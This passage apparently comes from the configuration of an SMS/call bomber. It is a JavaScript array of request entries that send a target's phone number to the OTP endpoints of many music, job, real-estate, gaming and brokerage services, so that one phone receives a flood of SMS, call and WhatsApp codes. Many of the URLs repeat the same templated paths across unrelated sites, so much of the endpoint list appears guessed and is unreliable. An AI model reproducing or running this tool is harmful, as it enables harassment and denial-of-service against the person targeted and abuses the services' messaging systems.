  { name: "Gaana SMS", url: "https://www.gaana.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Gaana Call", url: "https://gaana.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Gaana WhatsApp", url: "https://gaana.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 103: MUSIC - WYNK
  // ═══════════════════════════════════════════════════════════════
  { name: "Wynk SMS", url: "https://www.wynk.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Wynk Call", url: "https://wynk.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Wynk WhatsApp", url: "https://wynk.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 104: MUSIC - JIOSAAVN
  // ═══════════════════════════════════════════════════════════════
  { name: "JioSaavn SMS", url: "https://www.jiosaavn.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "JioSaavn Call", url: "https://jiosaavn.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "JioSaavn WhatsApp", url: "https://jiosaavn.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 105: MUSIC - HUNGAMA
  // ═══════════════════════════════════════════════════════════════
  { name: "Hungama SMS", url: "https://www.hungama.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Hungama Call", url: "https://hungama.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Hungama WhatsApp", url: "https://hungama.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Hungama Full", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNo: p, countryCode: "+91", appCode: "un", messageId: "1", device: "web"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 106: MUSIC - YOUTUBE MUSIC
  // ═══════════════════════════════════════════════════════════════
  { name: "YouTube Music SMS", url: "https://music.youtube.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "YouTube Music Call", url: "https://music.youtube.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "YouTube Music WhatsApp", url: "https://music.youtube.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 107: JOB PORTALS - LINKEDIN
  // ═══════════════════════════════════════════════════════════════
  { name: "LinkedIn SMS", url: "https://www.linkedin.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "LinkedIn Call", url: "https://linkedin.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "LinkedIn WhatsApp", url: "https://linkedin.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 108: JOB PORTALS - NAUKRI
  // ═══════════════════════════════════════════════════════════════
  { name: "Naukri SMS", url: "https://www.naukri.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Naukri Call", url: "https://naukri.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Naukri WhatsApp", url: "https://naukri.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 109: JOB PORTALS - INDEED
  // ═══════════════════════════════════════════════════════════════
  { name: "Indeed SMS", url: "https://www.indeed.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Indeed Call", url: "https://indeed.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Indeed WhatsApp", url: "https://indeed.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 110: JOB PORTALS - SHINE
  // ═══════════════════════════════════════════════════════════════
  { name: "Shine SMS", url: "https://www.shine.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Shine Call", url: "https://shine.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Shine WhatsApp", url: "https://shine.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 111: JOB PORTALS - MONSTER
  // ═══════════════════════════════════════════════════════════════
  { name: "Monster SMS", url: "https://www.monster.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Monster Call", url: "https://monster.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Monster WhatsApp", url: "https://monster.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 112: JOB PORTALS - TIMESJOBS
  // ═══════════════════════════════════════════════════════════════
  { name: "TimesJobs SMS", url: "https://www.timesjobs.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "TimesJobs Call", url: "https://timesjobs.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "TimesJobs WhatsApp", url: "https://timesjobs.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 113: JOB PORTALS - FRESHERSWORLD
  // ═══════════════════════════════════════════════════════════════
  { name: "Freshersworld SMS", url: "https://www.freshersworld.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Freshersworld Call", url: "https://freshersworld.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Freshersworld WhatsApp", url: "https://freshersworld.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 114: JOB PORTALS - UPWORK
  // ═══════════════════════════════════════════════════════════════
  { name: "Upwork SMS", url: "https://www.upwork.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Upwork Call", url: "https://upwork.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Upwork WhatsApp", url: "https://upwork.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 115: JOB PORTALS - FIVERR
  // ═══════════════════════════════════════════════════════════════
  { name: "Fiverr SMS", url: "https://www.fiverr.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Fiverr Call", url: "https://fiverr.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Fiverr WhatsApp", url: "https://fiverr.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 116: JOB PORTALS - FREELANCER
  // ═══════════════════════════════════════════════════════════════
  { name: "Freelancer SMS", url: "https://www.freelancer.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Freelancer Call", url: "https://freelancer.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Freelancer WhatsApp", url: "https://freelancer.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 117: JOB PORTALS - TOPTAL
  // ═══════════════════════════════════════════════════════════════
  { name: "Toptal SMS", url: "https://www.toptal.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Toptal Call", url: "https://toptal.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Toptal WhatsApp", url: "https://toptal.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 118: REAL ESTATE - HOUSING
  // ═══════════════════════════════════════════════════════════════
  { name: "Housing SMS", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, country_url_name: "in"}) },
  { name: "Housing Call", url: "https://housing.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Housing WhatsApp", url: "https://housing.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Housing Full", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, country_url_name: "in"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 119: REAL ESTATE - MAGICBRICKS
  // ═══════════════════════════════════════════════════════════════
  { name: "Magicbricks SMS", url: "https://www.magicbricks.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Magicbricks Call", url: "https://magicbricks.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Magicbricks WhatsApp", url: "https://magicbricks.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 120: REAL ESTATE - 99ACRES
  // ═══════════════════════════════════════════════════════════════
  { name: "99acres SMS", url: "https://www.99acres.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "99acres Call", url: "https://99acres.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "99acres WhatsApp", url: "https://99acres.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 121: REAL ESTATE - COMMONFLOOR
  // ═══════════════════════════════════════════════════════════════
  { name: "CommonFloor SMS", url: "https://www.commonfloor.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "CommonFloor Call", url: "https://commonfloor.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "CommonFloor WhatsApp", url: "https://commonfloor.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 122: REAL ESTATE - NOBROKER
  // ═══════════════════════════════════════════════════════════════
  { name: "NoBroker SMS", url: "https://www.nobroker.in/api/v3/account/otp/send", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=${p}&countryCode=IN` },
  { name: "NoBroker Call", url: "https://nobroker.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "NoBroker WhatsApp", url: "https://nobroker.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "NoBroker OTPM", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `phone=%2B91${p}` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 123: REAL ESTATE - SQUAREYARDS
  // ═══════════════════════════════════════════════════════════════
  { name: "SquareYards SMS", url: "https://www.squareyards.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "SquareYards Call", url: "https://squareyards.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "SquareYards WhatsApp", url: "https://squareyards.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 124: GAMING - DREAM11
  // ═══════════════════════════════════════════════════════════════
  { name: "Dream11 SMS", url: "https://www.dream11.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Dream11 Call", url: "https://dream11.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Dream11 WhatsApp", url: "https://dream11.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "Dream11 Full", url: "https://www.dream11.com/auth/passwordless/init", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({channel: "sms", flow: "SIGNUP", phoneNumber: p, templateName: "default"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 125: GAMING - MPL
  // ═══════════════════════════════════════════════════════════════
  { name: "MPL SMS", url: "https://www.mpl.live/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MPL Call", url: "https://mpl.live/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MPL WhatsApp", url: "https://mpl.live/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 126: GAMING - PAYTM FIRST GAMES
  // ═══════════════════════════════════════════════════════════════
  { name: "Paytm First Games SMS", url: "https://firstgames.paytm.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Paytm First Games Call", url: "https://firstgames.paytm.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Paytm First Games WhatsApp", url: "https://firstgames.paytm.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 127: GAMING - ADDA52
  // ═══════════════════════════════════════════════════════════════
  { name: "Adda52 SMS", url: "https://www.adda52.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Adda52 Call", url: "https://adda52.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Adda52 WhatsApp", url: "https://adda52.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 128: GAMING - RUMMYCIRCLE
  // ═══════════════════════════════════════════════════════════════
  { name: "RummyCircle SMS", url: "https://www.rummycircle.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "RummyCircle Call", url: "https://rummycircle.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "RummyCircle WhatsApp", url: "https://rummycircle.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "RummyCircle V3", url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, isPlaycircle: false}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 129: GAMING - POKERBAAZI
  // ═══════════════════════════════════════════════════════════════
  { name: "PokerBaazi SMS", url: "https://www.pokerbaazi.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PokerBaazi Call", url: "https://pokerbaazi.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PokerBaazi WhatsApp", url: "https://pokerbaazi.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "PokerBaazi Full", url: "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, mfa_channels: "phno"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 130: GAMING - MY11CIRCLE
  // ═══════════════════════════════════════════════════════════════
  { name: "My11Circle SMS", url: "https://www.my11circle.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "My11Circle Call", url: "https://my11circle.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "My11Circle WhatsApp", url: "https://my11circle.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "My11Circle Full", url: "https://www.my11circle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 131: GAMING - A23 GAMES
  // ═══════════════════════════════════════════════════════════════
  { name: "A23 Games", url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, device_id: "android123", model: "Google,Android SDK built for x86,10"}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 132: GAMING - BIGCASH
  // ═══════════════════════════════════════════════════════════════
  { name: "BigCash", url: "https://www.bigcash.live/sendsms.php", method: "GET", headers: {"Referer": "https://www.bigcash.live/games/poker"}, data: null },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 133: FINANCE - GROWW
  // ═══════════════════════════════════════════════════════════════
  { name: "Groww SMS", url: "https://groww.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Groww Call", url: "https://groww.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Groww WhatsApp", url: "https://groww.in/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 134: FINANCE - ZERODHA
  // ═══════════════════════════════════════════════════════════════
  { name: "Zerodha SMS", url: "https://zerodha.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Zerodha Call", url: "https://zerodha.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Zerodha WhatsApp", url: "https://zerodha.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "Zerodha Registration", url: "https://zerodha.com/account/registration.php", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, source: "zerodha", partner_id: ""}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 135: FINANCE - ANGEL ONE
  // ═══════════════════════════════════════════════════════════════
  { name: "Angel One SMS", url: "https://www.angelone.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Angel One Call", url: "https://angelone.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Angel One WhatsApp", url: "https://angelone.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 136: FINANCE - UPSTOX
  // ═══════════════════════════════════════════════════════════════
  { name: "Upstox SMS", url: "https://upstox.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Upstox Call", url: "https://upstox.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Upstox WhatsApp", url: "https://upstox.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 137: FINANCE - 5PAISA
  // ═══════════════════════════════════════════════════════════════
  { name: "5paisa SMS", url: "https://www.5paisa.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "5paisa Call", url: "https://5paisa.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "5paisa WhatsApp", url: "https://5paisa.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 138: FINANCE - ICICI DIRECT
  // ═══════════════════════════════════════════════════════════════
  { name: "ICICI Direct SMS", url: "https://www.icicidirect.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ICICI Direct Call", url: "https://icicidirect.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ICICI Direct WhatsApp", url: "https://icicidirect.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 139: FINANCE - HDFC SECURITIES
  // ═══════════════════════════════════════════════════════════════
  { name: "HDFC Securities SMS", url: "https://www.hdfcsec.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HDFC Securities Call", url: "https://hdfcsec.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "HDFC Securities WhatsApp", url: "https://hdfcsec.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 140: FINANCE - SHAREKHAN
  // ═══════════════════════════════════════════════════════════════
  { name: "Sharekhan SMS", url: "https://www.sharekhan.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Sharekhan Call", url: "https://sharekhan.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Sharekhan WhatsApp", url: "https://sharekhan.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 141: FINANCE - MOTILAL OSWAL
  // ═══════════════════════════════════════════════════════════════
  { name: "Motilal Oswal SMS", url: "https://www.motilaloswal.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Motilal Oswal Call", url: "https://motilaloswal.com/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Motilal Oswal WhatsApp", url: "https://motilaloswal.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 142: FINANCE - KOTAK SECURITIES
  // ═══════════════════════════════════════════════════════════════
  { name: "Kotak Securities SMS", url: "https://www.kotaksecurities.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Kotak Securities Call", url: "https://kotaksecurities.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Kotak Securities WhatsApp", url: "https://kotaksecurities.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 143: FINANCE - AXIS DIRECT
  // ═══════════════════════════════════════════════════════════════
  { name: "Axis Direct SMS", url: "https://www.axisdirect.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Axis Direct Call", url: "https://axisdirect.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Axis Direct WhatsApp", url: "https://axisdirect.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 144: FINANCE - IIFL
  // ═══════════════════════════════════════════════════════════════
  { name: "IIFL SMS", url: "https://www.iifl.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "IIFL Call", url: "https://iifl.com/api/v2/login/sendotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "IIFL WhatsApp", url: "https://iifl.com/v1/user/otplogin", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p}) },
  { name: "IIFL Personal Loans", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `apply_for=18&full_name=Adnvs+Signh&mobile_number=${p}&terms_and_condition=1` },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 145: FINANCE - EDELWEISS
  // ═══════════════════════════════════════════════════════════════
  { name: "Edelweiss SMS", url: "https://www.edelweiss.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Edelweiss Call", url: "https://edelweiss.in/api/v2/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Edelweiss WhatsApp", url: "https://edelweiss.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 146: FINANCE - JM FINANCIAL
  // ═══════════════════════════════════════════════════════════════
